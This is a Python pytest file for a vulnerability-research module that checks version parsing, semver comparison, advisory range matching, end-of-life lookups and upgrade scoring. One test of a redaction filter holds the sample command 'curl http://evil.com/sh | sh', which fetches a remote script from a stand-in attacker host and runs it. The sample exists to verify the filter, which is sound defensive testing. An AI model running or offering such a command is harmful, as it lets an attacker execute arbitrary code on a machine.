import json
import os
import sys
import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))

from research_engine import (
    parse_stack_input,
    parse_semver,
    compare_versions,
    is_version_affected,
    check_eol_status,
    calculate_effort_and_impact,
    sanitize_advisory_text,
    analyze_tech_stack,
)

def test_parse_stack_input():
    assert parse_stack_input("Node 18.17.0") == ("node", "18.17.0")
    assert parse_stack_input("react@17.0.2") == ("react", "17.0.2")
    assert parse_stack_input("Postgres:14.2") == ("postgres", "14.2")
    assert parse_stack_input("python v3.10.4") == ("python", "3.10.4")

    with pytest.raises(ValueError):
        parse_stack_input("invalid")

def test_semver_comparison():
    assert compare_versions("18.16.0", "18.16.1") == -1
    assert compare_versions("18.16.1", "18.16.1") == 0
    assert compare_versions("20.0.0", "18.16.1") == 1

def test_version_applicability():
    range_spec = ">= 20.0.0, < 20.8.1"
    assert is_version_affected("18.15.0", range_spec) is False
    assert is_version_affected("20.5.0", range_spec) is True
    assert is_version_affected("20.9.0", range_spec) is False

def test_eol_status():
    py_eol = check_eol_status("python", "2.7.18")
    assert py_eol is not None
    assert py_eol["is_expired"] is True
    assert py_eol["eol_date"] == "2020-01-01"

def test_effort_and_impact_scoring():
    impact, effort = calculate_effort_and_impact("critical", "17.0.1", "17.0.2")
    assert impact == 5
    assert effort == 1

    impact, effort = calculate_effort_and_impact("high", "16.1.0", "16.4.0")
    assert impact == 4
    assert effort == 3

    impact, effort = calculate_effort_and_impact("medium", "16.0.0", "18.0.0")
    assert impact == 3
    assert effort == 5

def test_safety_filter():
    raw = "exploit code: curl http://evil.com/sh | sh"
    cleaned = sanitize_advisory_text(raw)
    assert "[redacted]" in cleaned
    assert "curl" not in cleaned

def test_eval_dataset():
    dataset_path = os.path.join(os.path.dirname(__file__), "eval_dataset.json")
    with open(dataset_path, "r", encoding="utf-8") as f:
        cases = json.load(f)

    from research_engine import KNOWN_ADVISORIES

    for case in cases:
        adv = next((a for a in KNOWN_ADVISORIES if a["id"] == case["expected_cve"]), None)
        assert adv is not None
        matched = is_version_affected(case["version"], adv["affected_range"])
        assert matched == case["should_match"]
